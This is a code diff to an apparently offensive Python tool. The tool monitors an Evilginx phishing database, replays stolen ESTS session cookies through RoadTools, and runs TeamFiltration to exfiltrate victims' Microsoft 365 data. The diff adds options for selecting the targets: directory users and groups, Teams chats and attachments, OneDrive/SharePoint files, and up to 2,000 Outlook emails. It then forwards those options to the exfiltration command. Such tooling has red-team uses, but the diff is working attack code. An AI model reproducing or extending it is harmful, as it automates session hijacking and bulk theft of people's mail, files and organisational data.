@@ -31,6 +31,7 @@ WARNING_ICON = Fore.YELLOW + "[WARNING] "
 
 # Initialize the Pushover client to send notifications
 pushClient = None
+tfArguments = []
 
 class PushoverClient:
     def __init__(self, user_key, api_token):
@@ -174,21 +175,26 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
             binary_name = "TeamFiltration"
             if platform.system() == "Windows":
                 binary_name += ".exe"
-            process = subprocess.Popen(f"{binary_name} --outpath {safeUserName} --exfil --all  --roadtools {outfilePath}",  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-            # Display the output as it is generated
-            while True:
-                output = process.stdout.readline()
-                if output == '' and process.poll() is not None:
-                    break
-                if output:
-                    print(output.strip())
-            # Capture any remaining output
-            stdout, stderr = process.communicate()
-            if stdout:
-                print(stdout.strip())
-            if stderr:
-                print(stderr.strip(), file=sys.stderr)
+            
+            if tfArguments:
+                commandLine =f"{binary_name} --outpath {safeUserName} --roadtools {outfilePath} --exfil "
+                commandLine += " ".join(tfArguments)
+                print(INFO_ICON + commandLine)
+                process = subprocess.Popen(commandLine,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                
+                # Display the output as it is generated
+                while True:
+                    output = process.stdout.readline()
+                    if output == '' and process.poll() is not None:
+                        break
+                    if output:
+                        print(output.strip())
+                # Capture any remaining output
+                stdout, stderr = process.communicate()
+                if stdout:
+                    print(stdout.strip())
+                if stderr:
+                    print(stderr.strip(), file=sys.stderr)
 
     except Exception as e:
         print(ERROR_ICON + f"Authentication error: {e}")
@@ -290,50 +296,37 @@ if __name__ == "__main__":
     """
     print(Fore.CYAN + banner)
 
-    parser = argparse.ArgumentParser(description="Evilginx database location")
+    parser = argparse.ArgumentParser()
     parser.add_argument("database_path", help="Path to the local OR remote Evilginx database file.")
 
-    ssh_group = parser.add_argument_group('SSH Options', 'Options for fetching the Evilginx database from a remote host via SSH')
+    ssh_group = parser.add_argument_group('SSH Options', 'Evilginx database monitoring SSH options')
     ssh_group.add_argument("--host", help="SSH hostname/IP when fetching from a remote host.")
     ssh_group.add_argument("--port", type=int, default=22, help="SSH port when fetching from a remote host.")
     ssh_group.add_argument("--username", help="SSH username when fetching from a remote host.", default="root")
     ssh_group.add_argument("--password", help="SSH password when fetching from a remote host.", required=False)
     ssh_group.add_argument("--key", default=os.path.expanduser("~/.ssh/id_rsa"), help="Path to the SSH private key file for authentication.")
 
-    pushover_group = parser.add_argument_group('Pushover Options', 'Options for sending Pushover notifications')
+    pushover_group = parser.add_argument_group('Pushover Options', 'Pushover notifications options')
     pushover_group.add_argument('--user-key', type=str, required=False, help='Pushover User Key')
     pushover_group.add_argument('--api-token', type=str, required=False, help='Pushover API Token')
 
-    intauth_group = parser.add_argument_group('RoadTools Options', description='Options for the interactive authentication Selenium flow from RoadTools roadtx')
-    intauth_group.add_argument('-c',
-                                '--client',
-                                action='store',
-                                help="Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)",
-                                default='1fec8e78-bce4-4aaf-ab1b-5451cc387264')
-    intauth_group.add_argument('-r',
-                                '--resource',
-                                action='store',
-                                help='Resource to authenticate to. Either a full URL or alias (list with roadtx listaliases)',
-                                default='https://graph.windows.net')
-    intauth_group.add_argument('-s',
-                                '--scope',
-                                action='store',
-                                help='Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.')
-    intauth_group.add_argument('-ru', '--redirect-url', action='store', metavar='URL',
-                                help='Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)',
-                                default="https://login.microsoftonline.com/common/oauth2/nativeclient")
-    intauth_group.add_argument('-t',
-                                '--tenant',
-                                action='store',
-                                help='Tenant ID or domain to auth to',
-                                required=False)
-    intauth_group.add_argument('-d', '--driver-path',
-                                action='store',
-                                help='Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)',
-                                default='geckodriver.exe')
-    intauth_group.add_argument('-k', '--keep-open',
-                                action='store_true',
-                                help='Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials')
+    teamfiltraiton_group = parser.add_argument_group('TeamFiltration Options', 'Exfiltration options for TeamFiltration')
+    teamfiltraiton_group.add_argument('--all', action='store_true', help='Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)')
+    teamfiltraiton_group.add_argument('--aad', action='store_true', help='Exfiltrate information from Graph API (domain users and groups)')
+    teamfiltraiton_group.add_argument('--teams', action='store_true', help='Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)')
+    teamfiltraiton_group.add_argument('--onedrive', action='store_true', help='Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the user\'s entire OneDrive directory)')
+    teamfiltraiton_group.add_argument('--owa', action='store_true', help='Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)')
+    teamfiltraiton_group.add_argument('--owa-limit', type=int, help='Set the max amount of emails to exfiltrate, default is 2k.')
+
+    
+    intauth_group = parser.add_argument_group('RoadTools Options', description='RoadTools RoadTX interactive authentication options')
+    intauth_group.add_argument('-c','--client',action='store',help="Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)",default='1fec8e78-bce4-4aaf-ab1b-5451cc387264')
+    intauth_group.add_argument('-r','--resource',action='store',help='Resource to authenticate to. Either a full URL or alias (list with roadtx listaliases)',default='https://graph.windows.net')
+    intauth_group.add_argument('-s','--scope',action='store',help='Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.')
+    intauth_group.add_argument('-ru', '--redirect-url', action='store', metavar='URL',help='Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)',default="https://login.microsoftonline.com/common/oauth2/nativeclient")
+    intauth_group.add_argument('-t','--tenant',action='store',help='Tenant ID or domain to auth to',required=False)
+    intauth_group.add_argument('-d', '--driver-path',action='store',help='Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)',default='geckodriver.exe')
+    intauth_group.add_argument('-k', '--keep-open', action='store_true', help='Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials')
     
     args = parser.parse_args()
     processed_combinations = set()
@@ -345,6 +338,23 @@ if __name__ == "__main__":
         pushover_configured=True
         pushClient = PushoverClient(args.user_key, api_token=args.api_token)
         print(INFO_ICON + "Pushover notifications activated!")
+
+
+
+    if args.all:
+        tfArguments.append('--all')
+    else:
+        if args.aad:
+            tfArguments.append('--aad')
+        if args.teams:
+            tfArguments.append('--teams')
+        if args.onedrive:
+            tfArguments.append('--onedrive')
+        if args.owa:
+            tfArguments.append('--owa')
+    
+    if args.owa_limit:
+        tfArguments.append(f'--owa-limit {args.owa_limit}')
 
     if args.host:
         remote_info = {
